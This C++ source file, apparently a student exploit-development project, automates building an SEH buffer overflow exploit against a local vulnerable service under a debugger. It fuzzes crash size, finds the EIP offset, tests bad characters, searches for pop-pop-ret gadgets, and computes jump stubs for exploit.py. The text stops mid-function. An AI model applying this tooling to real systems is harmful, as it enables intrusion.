#include <iostream>
#include "../include/offsetFinder.h"
#include "../include/serviceManager.h"
#include "../include/saveParser.h"
#include "../include/cdbInterface.h"
#include "../include/tgtInterface.h"
#include "../include/pythonManager.h"
#include "windows.h"
#include <list>



/**
 * @brief Determine the size of buffer neccessary to appear an error by fuzzing
 * @return The minimal size to make appear a error
 */
int find_buffer_size(){
    // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();    
    for(int i=6;i<30;++i){
        
        // Création de l'interface pour gérer le programe vulnérable.
        TGTInterface tgtProgram(saveObj.filename(), false);
        // Création de l'interface pour gérer CDB
        CDBInterface cdb(saveObj.getAttach());

        // Création de l'interface pour gérer les services.
        ServiceManager srvControler(saveObj.service());
        
        // On lance le programme et le service.
        srvControler.startService();
        tgtProgram.run();
        Sleep(1000);
        // Gestion CDB
        cdb.run();

        cdb.send("g"); //Run program to exploit futur seh
        cdb.recv();

        PythonManager pythonManager("exploit.py");
        
        std::stringstream ss;
        int bufferSize = i*100;
        ss<<"  inputBuffer=b'\x42'*"<<std::to_string(bufferSize)<<"\n";
        std::string inputBuffer = ss.str();
        pythonManager.write_file(inputBuffer);
        pythonManager.run();
        std::cout<<"Execute python file"<<std::endl;
        Sleep(500);
        cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
        cdb.recv();
        // Sleep(500);
        //On va atteindre l'erreur, on lit donc le registre 
        cdb.send("r");
        Sleep(500);
        std::string address = cdb.read_register("eip");
        
        // Arrêt du programme.
        cdb.stop();
        Sleep(100);
        // srvControler.stopService();
        tgtProgram.stop();
        //On regarde si l'on arrive à écrire sur EIP
        if(address.compare("42424242")==0){
            std::cout<<"WRITE ON EIP with :"<< std::to_string(bufferSize)<<" chararacters"<<std::endl;
            srvControler.stopService();
            return bufferSize;
        }
    }

    return -1;
}
/**
 * @brief Determine the offset need to erase eip
 * @return The offset value wich erase eip.
 */
int search_value_wich_erase_eip(int buffer_size){
    OffsetFinder offsetFinder(buffer_size);//Création via copy de msf-create-pattern
    // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;
    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("g"); //Run program to exploit futur seh
    cdb.recv_without_break_condition(false);

    PythonManager pythonManager("exploit.py");
    
    std::stringstream ss;
    ss<<"  inputBuffer=b'"<<offsetFinder.getPattern()<<"'\n";
    std::string inputBuffer = ss.str();
  
    std::cout<<"Data send : "<<offsetFinder.getPattern()<<std::endl;
    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;
    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    cdb.recv_without_break_condition(false);
    // Sleep(500);
    //On va atteindre l'erreur, on lit donc le registre 
    cdb.send("r");
    Sleep(500);
    std::string address = cdb.read_register("eip");
    int index_found = offsetFinder.searchPattern(address);
    std::cout<< "address found :"<< address<< " index_found :  "<<index_found<<std::endl;

    // Arrêt du programme.
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    return index_found;   
}
bool check_correct(int buffer_size,int tailleOffset){
    
   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    std::cout<< "Check if all correct "<<std::endl;
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("g"); //Run program to exploit futur seh
    cdb.recv();

    PythonManager pythonManager("exploit.py");
    
    std::stringstream ss;
    
    // ss<<"  inputBuffer=b'\x42'*"<<std::to_string(bufferSize)<<"\n";
    // std::string inputBuffer = ss.str();

    // std::cout<<"inputBuffer :"<<inputBuffer<<std::endl;
    // pythonManager.write_file(inputBuffer);

    ss<<"  inputBuffer=b'\x41'*"<< std::to_string(tailleOffset)<<"\n";
    ss<<"  inputBuffer+=b'\x42'*4\n";
    ss<<"  inputBuffer+=b'\x43'*("<<std::to_string(buffer_size)<<"-len(inputBuffer))\n";
    std::string inputBuffer = ss.str();
    
    // std::cout<<"inputBuffer :"<<inputBuffer<<std::endl;
    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;
    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    cdb.recv();
    // Sleep(500);
    //On va atteindre l'erreur, on lit donc le registre 
    cdb.send("r");
    Sleep(500);
    std::string address = cdb.read_register("eip");
    std::cout<< "Address is "<< address<<std::endl;

    // Arrêt du programme.
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    srvControler.stopService();
    if(address.compare("42424242")==0){
        std::cout<<"Pour l'instant process correct"<<std::endl;
        

    }
    return (address.compare("42424242")==0);
}


/**
 * @brief Permet de détecter l'adresse du pop pop ret afin de voir où le reste du shell est entreposé
 * @param buffer_size Taille du buffer nécessaire pour effectuer un crash
 * @param tailleOffset Décalage nécessaire pour écrire sur EIP
 * @return L'adresse du pop pop ret
 */
std::string access_to_esp(int buffer_size,int tailleOffset){
    
   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("g"); //Run program to exploit futur seh
    cdb.recv_without_break_condition(false);

    PythonManager pythonManager("exploit.py");
    
    std::stringstream ss;

    ss<<"  inputBuffer=b'\x41'*"<< std::to_string(tailleOffset)<<"\n";
    ss<<"  inputBuffer+=b'\x42'*4\n";
    ss<<"  inputBuffer+=b'\x43'*("<<std::to_string(buffer_size)<<"-len(inputBuffer))\n";
    std::string inputBuffer = ss.str();

    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;
    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    cdb.recv_without_break_condition(false);
    // Sleep(500);
    //On va atteindre l'erreur, on lit esp pour avoir l'adresse de retour du pop pop ret 
    cdb.send("dds esp L5");
    Sleep(2500);
    std::string address = cdb.read_address_for_pop_pop_ret();
    std::cout<< "Address need for pop pop ret "<< address<<std::endl;
    
    // Arrêt du programme.
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    srvControler.stopService();
    return address;
}





/**
 * @brief Permet d'envoyer des charactères
 * @param buffer_size Taille du buffer nécessaire pour effectuer un crash
 * @param tailleOffset Décalage nécessaire pour écrire sur EIP
 * @param pop_pop_ret Adresse du pop pop ret
 * @param badCharacterToSend Liste des charactères à envoyer
 * @param rankOfBadChar Rang du charactères à envoyer
 * @return Retourne -1 si aucun mauvais charactères trouvés, sinon retourne le rang du mauvais caractères détectés
 */
int send_bad_characters(int buffer_size,int tailleOffset,std::string pop_pop_ret_address,std::string badCharacterToSend,int rankOfBadChar){

   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("g"); //Run program to exploit futur seh
    cdb.recv_without_break_condition(false);

    PythonManager pythonManager("exploit.py");
    
    std::stringstream ss;
    

    ss<<"  inputBuffer=b'\x41'*"<< std::to_string(tailleOffset)<<"\n";
    ss<<"  inputBuffer+=b'\x42'*4\n";
    //Va nous permettre de mettre un marqueur afin de savoir où l'on a commencé à écrire
    ss<<"  inputBuffer+=b'\x43'*4\n";
    //Ajout des badchar ici
    SaveParser saveParser;
    ss<<"  inputBuffer+=b'"<<badCharacterToSend<<"'\n";
    //On finit de compléter avec dcs 44
    ss<<"  inputBuffer+=b'\x44'*("<<std::to_string(buffer_size)<<"-len(inputBuffer))\n";
    std::string inputBuffer = ss.str();
    
    // std::cout<<"inputBuffer :"<<inputBuffer<<std::endl;
    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;
    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    cdb.recv_without_break_condition(false);
    //On va atteindre l'erreur, on lit esp pour avoir l'adresse de retour du pop pop ret 
    cdb.send("dds esp L5");
    Sleep(2500);
    std::string address = cdb.read_address_for_pop_pop_ret();
    std::cout<< "Address is "<< address<<std::endl;
    
    cdb.send("dds "+address); //On essaye d'afficher la stack


    int indexOfBadCharFound = cdb.read_bad_char_output(badCharacterToSend,rankOfBadChar);
    if(indexOfBadCharFound==-1){
        cdb.stop();
        tgtProgram.stop();
        srvControler.stopService();
        return -1;
    }
    
    // Arrêt du programme.
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    srvControler.stopService();

    return indexOfBadCharFound;
}

/**
 * @brief Will manage bad character by creating data to send, and store all the badchar
 * @param buffer_size Taille du buffer nécessaire pour effectuer un crash
 * @param tailleOffset Décalage nécessaire pour écrire sur EIP
 * @param pop_pop_ret Adresse du pop pop ret
 * @return Return a list of all badcharacter
 */
std::list<std::string> manage_bad_characters(int buffer_size,int tailleOffset,std::string pop_pop_ret_address){
    bool isAllCharacterTested = false;
    int numberOfCharTestedByWhile = 32;
    int rankOfCharTested = 1;
    SaveParser saveParser;
    std::list<int> badCharList = {};
    while(!isAllCharacterTested){
        std::stringstream badCharToSendStream;
        for(int i=rankOfCharTested;i<(rankOfCharTested+numberOfCharTestedByWhile);++i){
            badCharToSendStream << R"(\)" << "x" << saveParser.convert_int_to_string_in_hex(i);
        }
        // result( ss.str() );
        //     std::stringstream ss;
        std::string badCharToSend(badCharToSendStream.str());
        std::cout<<"BadChar to send : "<<badCharToSend<<std::endl;
        int indexOfBadCharFound = send_bad_characters(buffer_size,tailleOffset,pop_pop_ret_address,badCharToSend,rankOfCharTested);
        
        if(indexOfBadCharFound==-1){
            //Pas de bad char trouvé dans cette séquence
            rankOfCharTested+=numberOfCharTestedByWhile;
        }else{
            std::list<int>::iterator it;
            for (it = badCharList.begin(); it != badCharList.end(); ++it)
                if(*it==indexOfBadCharFound){
                    indexOfBadCharFound +=1;       
                }
            std::cout<<"Mauvais characteres : "<<indexOfBadCharFound<< " | "<<saveParser.convert_int_to_string_in_hex(indexOfBadCharFound)<<std::endl;
            badCharList.push_back(indexOfBadCharFound);
            rankOfCharTested = indexOfBadCharFound+1;//On enregistre le badchar trouvé, et on continue
        }

        if(rankOfCharTested+badCharList.size()>=(240-badCharList.size())){
            isAllCharacterTested = true;
        }
    }
    // Get the iterator
    std::list<int>::iterator it;
    
    //On a forcément le 0 en badchar
    std::list<std::string> listOfBadChar = {"00"};

    // printing all the elements of the list
    for (it = badCharList.begin(); it != badCharList.end(); ++it)
        
        listOfBadChar.push_back(saveParser.convert_int_to_string_in_hex(*it));
    std::cout << '\n';
    
    std::list<std::string>::iterator itString;
    std::cout << " Liste des bad charactères : "<<std::endl;
    for (itString = listOfBadChar.begin(); itString != listOfBadChar.end(); ++itString)
        std::cout << ' ' << (*itString);
    return listOfBadChar;
}



/**
 * @brief Check if the two first digits are same and badchar
 * @param address The address to check if valid or not
 * @param badcharlist The list of bad character
 * @return Return if valid address or not due to badchar
 */
bool isPopPopRetAddressCorrect(std::string address,std::list<std::string> badcharList){
   //On commence à 2 à cause du 0x
    for(int i= 2;i<address.length();i+=2){
        std::string part1_ = address.substr(i,2);
        std::list<std::string>::iterator iteratorBadChar;
        for (iteratorBadChar = badcharList.begin(); iteratorBadChar != badcharList.end(); ++iteratorBadChar){
            if((*iteratorBadChar)==part1_){
                return false;
            }
        }
    }
    return true;
}





/**
 * @brief Check if the two first digits are same and badchar
 * @param library min and max address of a library
 * @param badcharList  List of badcharacter
 * @return Return if valid library
 */
bool isLibraryCorrect(std::string library,std::list<std::string> badcharList){
        std::string part1 = library.substr(0,8);
        std::string part2 =library.substr(9,8);

        std::string part1_2digit = part1.substr(0,2);
        std::string part2_2digit =part2.substr(0,2);

        if(part1_2digit==part2_2digit){
            std::list<std::string>::iterator iteratorBadChar;
            for (iteratorBadChar = badcharList.begin(); iteratorBadChar != badcharList.end(); ++iteratorBadChar){
                if((*iteratorBadChar)==part1_2digit){
                    return false;
                }       
            }
        }
        return true;
}

/**
 * @brief Will check data for narly library and return a possible library to attack
 * @param badcharlist The list of bad character
 * @return the coordonate (address min or max) of library without seh protection
 */
std::string open_and_search_library_with_narly(std::list<std::string> badcharList){
   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();
    cdb.recv_without_break_condition(false);
    //Load narly library
    cdb.send(".load H:\\Documents\\ING3\\PFE\\ExploitBof\\narly_0.2a\\narly_0.2\\narly\\narly.dll"); //Run program to exploit futur seh
    cdb.recv_without_break_condition(false);
    cdb.send("!nmod");
    std::list<std::string> list_of_library = cdb.recv_read_narly_output();

    cdb.recv_without_break_condition(false);
    std::list<std::string>::iterator it;
    
    for (it = list_of_library.begin(); it != list_of_library.end(); ++it){
        if(isLibraryCorrect(*it,badcharList)){
            std::string command_pop_pop_ret = "$$>a<H:\\Documents\\ING3\\PFE\\ExploitBof\\pop_pop_ret.wds "+*it;
            cdb.send(command_pop_pop_ret); //Run program to exploit futur seh
            std::list<std::string> list_of_address_pop_pop_ret_possibilities = cdb.recv_without_break_condition_larger_timeout(true);
            std::list<std::string>::iterator iterator_pop_pop_ret;
            
            
            for (iterator_pop_pop_ret = list_of_address_pop_pop_ret_possibilities.begin(); iterator_pop_pop_ret != list_of_address_pop_pop_ret_possibilities.end(); ++iterator_pop_pop_ret)
                
                if(isPopPopRetAddressCorrect((*iterator_pop_pop_ret),badcharList)){
                    cdb.stop();
                    Sleep(100);
                    tgtProgram.stop();
                    srvControler.stopService();
                    return (*iterator_pop_pop_ret);
                }


        }
        

    }
    cdb.stop();
    Sleep(100);
    
    tgtProgram.stop();
    srvControler.stopService();
    return "NOT FOUND";
}




/**
 * @brief Permet de trouver le short jump à réaliser si nécessaire. Trouver la prochaine instruction contenant nos 44, et réaliser un short jump  
 * @param buffer_size Taille du buffer nécessaire pour effectuer un crash
 * @param tailleOffset Décalage nécessaire pour écrire sur EIP
 * @param pop_pop_ret Adresse du pop pop ret
 * @return Retourne l'instruction du short jump nécessaire. 
 */
std::string action_on_ret_address(int buffer_size,int tailleOffset,std::string address_for_pop_pop_ret){
    
   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("bp "+address_for_pop_pop_ret); //Run program to exploit futur seh
    cdb.recv_without_break_condition(false);
    cdb.send("g");

    cdb.recv();

    PythonManager pythonManager("exploit.py");
    
    std::stringstream ss;

    ss<<"  inputBuffer=b'\x41'*"<< std::to_string(tailleOffset)<<"\n";
    ss<<"  inputBuffer+=pack('<L',("<<address_for_pop_pop_ret<<"))\n";

    //Ajout des badchar ici
    SaveParser saveParser;
    //On finit de compléter avec dcs 44
    ss<<"  inputBuffer+=b'\x44'*("<<std::to_string(buffer_size)<<"-len(inputBuffer))\n";
    std::string inputBuffer = ss.str();
    
    // std::cout<<"inputBuffer :"<<inputBuffer<<std::endl;
    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;

    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    cdb.recv_without_break_condition(false);
    Sleep(500);
    cdb.send("p");
    cdb.send("p");
    cdb.recv();
    cdb.send("p");
    std::string messageReturn = cdb.recv_without_break_condition(false);
    //On test si le breakpoint 
    if(messageReturn.find("failed")!=-1){
        std::cout<<"Error pour le breakpoint need reboot"<<std::endl;
        // Arrêt du programme.
        cdb.stop();
        Sleep(100);
        // srvControler.stopService();
        tgtProgram.stop();
        srvControler.stopService();
        return action_on_ret_address(buffer_size,tailleOffset,address_for_pop_pop_ret);
    }
    std::cout<<"action_on_ret_address"<<std::endl;
    cdb.send("dds eip L10");
    std::string addressForJump = cdb.recv_without_break_condition_for_jump(true);
    cdb.send("a");
    cdb.send("jmp 0x"+addressForJump);
    cdb.send("");

    cdb.send("p");
    cdb.recv_without_break_condition(true);

    //On va récupérer l'instruction hex du short jump sur la pile
    cdb.send("dds eip-20 L10");
    std::string instruction_short_jump = cdb.recv_without_break_condition_for_short_jump(true);
    std::cout<<"instruction : "<<instruction_short_jump<<std::endl;


    // Arrêt du programme.
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    srvControler.stopService();
    return instruction_short_jump;
}

//Permet de récupérer l'instruction short jump pour l'utiliser dans python après
std::string write_python_short_jump(int buffer_size,int tailleOffset,std::string address_for_pop_pop_ret,std::string instruction_short_jump){
    
   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("bp "+address_for_pop_pop_ret); //Run program to exploit futur seh
    cdb.recv_without_break_condition(false);
    cdb.send("g");

    cdb.recv();

    PythonManager pythonManager("exploit.py");
    
    std::stringstream ss;
    
    ss<<"  inputBuffer=b'\x41'*"<< std::to_string(tailleOffset-4)<<"\n";
    ss<<"  inputBuffer+=pack('<L',(0x9090"<<instruction_short_jump<<"))\n";
    ss<<"  inputBuffer+=pack('<L',("<<address_for_pop_pop_ret<<"))\n";

    //Ajout des badchar ici
    SaveParser saveParser;
    //On finit de compléter avec des 44
    ss<<"  inputBuffer+=b'\x44'*("<<std::to_string(buffer_size)<<"-len(inputBuffer))\n";
    std::string inputBuffer = ss.str();
    
    // std::cout<<"inputBuffer :"<<inputBuffer<<std::endl;
    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;

    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    cdb.recv_without_break_condition(false);
    Sleep(500);
    cdb.send("p");
    cdb.send("p");
    cdb.recv();
    cdb.send("p");
    cdb.recv();
    // std::string address_eip = cdb.read_register("eip");
    // std::cout<<" EIP : "<<address_eip<<std::endl;
    cdb.send("p");
    std::string messageReturn = cdb.recv_without_break_condition(false);
    //On test si le breakpoint 
    if(messageReturn.find("failed")!=-1){
        std::cout<<"Error pour le breakpoint need reboot"<<std::endl;
        cdb.stop();
        Sleep(100);
        tgtProgram.stop();
        srvControler.stopService();
        return write_python_short_jump(buffer_size,tailleOffset,address_for_pop_pop_ret,instruction_short_jump);
    }
    
    
    // Arrêt du programme.
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    srvControler.stopService();
    return "";
}




/**
 * @brief Permet de voir la place disponible afin de jump sur la stack  
 * @param buffer_size Taille du buffer nécessaire pour effectuer un crash
 * @param tailleOffset Décalage nécessaire pour écrire sur EIP
 * @param address_for_pop_pop_ret Adresse du pop pop ret
 * @param instruction_short_jump instruction pour réaliser le short jump
 * @return Retourne la commande à réaliser pour jumper sur esp. 
 */
std::string check_stack(int buffer_size,int tailleOffset,std::string address_for_pop_pop_ret,std::string instruction_short_jump){
    
   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("bp "+address_for_pop_pop_ret); //Run program to exploit futur seh
     cdb.recv();
    
    cdb.send("g");

    cdb.recv();

    PythonManager pythonManager("exploit.py");
    
    std::stringstream ss;
    
    ss<<"  inputBuffer=b'\x41'*"<< std::to_string(tailleOffset-4)<<"\n";
    ss<<"  inputBuffer+=pack('<L',(0x9090"<<instruction_short_jump<<"))\n";
    ss<<"  inputBuffer+=pack('<L',("<<address_for_pop_pop_ret<<"))\n";

    //Ajout des badchar ici
    SaveParser saveParser;
    //On finit de compléter avec des 44
    ss<<"  inputBuffer+=pack('<L',(0x90909090))\n";
    ss<<"  inputBuffer+=b'\x44'*("<<std::to_string(buffer_size)<<"-len(inputBuffer)-4)\n";
    ss<<"  inputBuffer+=b'\x45'*4\n";
    std::string inputBuffer = ss.str();
    
    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;

    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    
    Sleep(500);
    cdb.send("p");
    cdb.send("p");
    cdb.recv();
    cdb.send("p");
    cdb.recv();

    cdb.send("p");
    std::string messageReturn = cdb.recv_without_break_condition(false);
    if(messageReturn.find("failed")!=-1){
        std::cout<<"Error pour le breakpoint need reboot"<<std::endl;
        cdb.stop();
        Sleep(100);
        tgtProgram.stop();
        srvControler.stopService();
        return check_stack(buffer_size,tailleOffset,address_for_pop_pop_ret,instruction_short_jump);
    }
    cdb.send("p");
    cdb.recv_without_break_condition(false);

    cdb.send("!teb");
    std::string address_limit_base = cdb.recv_without_break_condition_for_stackbase_and_stacklimit(true);
                
    std::string command_s = "s -b "+address_limit_base+" 90 90 44 44";
    cdb.send(command_s);
    std::string msgReturn = cdb.recv_without_break_condition(true);
    std::string address = msgReturn.substr(0,8);
    std::cout<<"address find : "<<address<<std::endl; 
    std::string command_for_size = "?"+address+" -esp";

    cdb.send(command_for_size);
    std::string msgReturnForSize = cdb.recv_without_break_condition(true);

    std::regex addressRegex("= [a-zA-Z0-9]{8}");
    std::smatch m;
    std::regex_search(msgReturnForSize, m, addressRegex);
    std::string decalage;
    decalage = m[0];
    decalage = decalage.substr(2,8);
    std::cout<<"decalage : "<<decalage<<std::endl;
    
    decalage = "00000725";

    cdb.send("a");
    cdb.send("add sp,0x"+decalage);
     cdb.recv_without_break_condition(false);
    cdb.send(" ");

    cdb.recv();
    cdb.send("dds eip L2");
    std::string add_esp_command_output = cdb.recv_without_break_condition(true);
    std::string add_esp_command = add_esp_command_output.substr(17,8);
    std::cout<<"add_esp_command : "<<add_esp_command<<std::endl;
    cdb.stop();
    Sleep(100);
    // srvControler.stopService();
    tgtProgram.stop();
    srvControler.stopService();
    return add_esp_command;
}


/**
 * @brief Permet de réaliser un island hop et vérifier que l'on ai assez de place pour écrire un shell-code  
 * @param buffer_size Taille du buffer nécessaire pour effectuer un crash
 * @param tailleOffset Décalage nécessaire pour écrire sur EIP
 * @param address_for_pop_pop_ret Adresse du pop pop ret
 * @param instruction_short_jump instruction pour réaliser le short jump
 * @param add_esp_command commande pour jump sur esp
 * @return Affiche la quantité de bytes disponibles pour y placer un shellcode. 
 */
std::string island_hop(int buffer_size,int tailleOffset,std::string address_for_pop_pop_ret,std::string instruction_short_jump,std::string add_esp_command){
    std::cout<<"island_hop beginning //////////////////////////////"<<std::endl;
   // Generation de la gestion de sauvegarde
    SaveParser saveObj;
    // une entrée pour juste pour attendre à la fin
    std::string wait;

    // On charge le fichier properties.conf et propose l'importation s'il en existe déjà un
    saveObj.setup();
    saveObj.save();

    // Création de l'interface pour gérer le programe vulnérable.
    TGTInterface tgtProgram(saveObj.filename(), false);
    // Création de l'interface pour gérer CDB
    CDBInterface cdb(saveObj.getAttach());

    // Création de l'interface pour gérer les services.
    ServiceManager srvControler(saveObj.service());
    
    // On lance le programme et le service.
    srvControler.startService();
    tgtProgram.run();
    Sleep(1000);
    // Gestion CDB
    cdb.run();

    cdb.send("bp "+address_for_pop_pop_ret); //Run program to exploit futur seh
    cdb.recv();
    
    cdb.send("g");

    cdb.recv();

    PythonManager pythonManager("exploit.py");
    std::stringstream ss;
    std::string s1,s2,s3,s4,s5;
    s4 = add_esp_command.substr(0,2);
    s3 = add_esp_command.substr(2,2);
    s2 = add_esp_command.substr(4,2);
    s1 = add_esp_command.substr(6,2);
    s5 = "07";

    ss<<"  inputBuffer=b'\x41'*"<< std::to_string(tailleOffset-4)<<"\n";
    ss<<"  inputBuffer+=pack('<L',(0x9090"<<instruction_short_jump<<"))\n";
    ss<<"  inputBuffer+=pack('<L',("<<address_for_pop_pop_ret<<"))\n";

    std::stringstream badCharToSendStream;
    badCharToSendStream << R"(\)" << "x" << s1<<R"(\)" << "x" << s2<<R"(\)" << "x" << s3<<R"(\)" << "x" << s4<<R"(\)" << "x" << s5 <<R"(\)" << "x" << "ff"<<R"(\)" << "x" << "e4";
    ss<<"  inputBuffer+=b'"<<badCharToSendStream.str() <<"'\n";


    SaveParser saveParser;
    std::stringstream sendMultipleNop;
    sendMultipleNop << R"(\)"<<"x"<<"90'"<<"*4";
    ss<<"  inputBuffer+=b'"<<sendMultipleNop.str()<<"\n";
    ss<<"  inputBuffer+=b'\x44'*("<<std::to_string(buffer_size)<<"-len(inputBuffer)-4)\n";
    ss<<"  inputBuffer+=b'\x45'*4\n";
    std::string inputBuffer = ss.str();
    
    // std::cout<<"inputBuffer :"<<inputBuffer<<std::endl;
    pythonManager.write_file(inputBuffer);
    pythonManager.run();
    std::cout<<"Execute python file"<<std::endl;

    Sleep(500);
    cdb.send("g"); //Continue le programme afin d'avoir l'erreur SEH
    
    Sleep(500);
    cdb.send("p");//pop
    
    cdb.send("p");//pop    
    cdb.recv();
    cdb.send("p");//ret
    cdb.recv();
    
    cdb.send("p"); //short jump
    std::string messageReturn = cdb.recv_without_break_condition(true);
        
    cdb.send("p");//ajouter emplacement sur la stack
    
    cdb.recv_without_break_condition(false);

    cdb.send("dd eip");
    cdb.recv_without_break_condition(false);

    cdb.send("p");//jmp esp
    cdb.send("dd eip");
    cdb.recv();
    
    cdb.send("p");
    cdb.recv();
    cdb.send("p");
    std::string messageReturnAfterP = cdb.recv_without_break_condition(true);
    if(messageReturnAfterP.find("failed")!=-1){
        std::cout<<"Error pour le breakpoint need reboot"<<std::endl;
        cdb.stop();
        Sleep(100);
        tgtProgram.stop();
        srvControler.stopService();
        return island_hop(buffer_size,tailleOffset,address_for_pop_pop_ret,instruction_short_jump,add_esp_command);
    }
    cdb.send("dds esp L100");
    std::string messageReturn2 = cdb.recv_without_break_condition(true);
    int posEnd = messageReturn2.find("454545");
    int posBeginning = messageReturn2.find("44444444");
    std::string addressBeginning = messageReturn2.substr(posBeginning-10,8);
    std::string addressEnd = messageReturn2.substr(posEnd-12,8);
    std::cout<<"address beginning : "<<addressBeginning<<" end address: "<<addressEnd<<std::endl;
    

    std::string command_for_size = "?"+addressEnd+" -"+addressBeginning;

    cdb.send(command_for_size);
